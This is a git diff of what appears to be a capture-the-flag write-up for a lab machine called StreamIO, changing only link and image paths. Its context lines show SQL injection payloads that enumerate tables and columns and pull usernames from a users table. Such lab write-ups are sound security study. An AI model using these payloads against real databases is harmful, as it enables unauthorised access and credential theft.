@@ -128,8 +128,8 @@ playing with the input, we can easily find the query to print all:
 
 now let's use the column tricks I learned in the sql documentation:
 
-{% content-ref url="../../still-sorting-out/documentation/cybersecurity-documentation/web-application/sql-injection.md" %}
-[sql-injection.md](../../still-sorting-out/documentation/cybersecurity-documentation/web-application/sql-injection.md)
+{% content-ref url="../../still-sorting-out/documentation/cybersecurity-documentation/web-application/sql-injection/" %}
+[sql-injection](../../still-sorting-out/documentation/cybersecurity-documentation/web-application/sql-injection/)
 {% endcontent-ref %}
 
 damn first try :joy:
@@ -209,13 +209,13 @@ so to continue our sqli i look at the syntax on the website:
 
 {% embed url="https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-objects-transact-sql?view=sql-server-ver16" %}
 
-<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 abcd'union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U';-- -
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 we continue our way in:&#x20;
 
@@ -223,7 +223,7 @@ we continue our way in:&#x20;
 abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 we got the interesting tables, so now we'll try getting both at once:
 
@@ -231,7 +231,7 @@ we got the interesting tables, so now we'll try getting both at once:
 abcd'union select 1,username,3,4,5,6 from users;-- -
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We could try to do the same for the password and go from there but let's directly concat the 2 in one query:
 
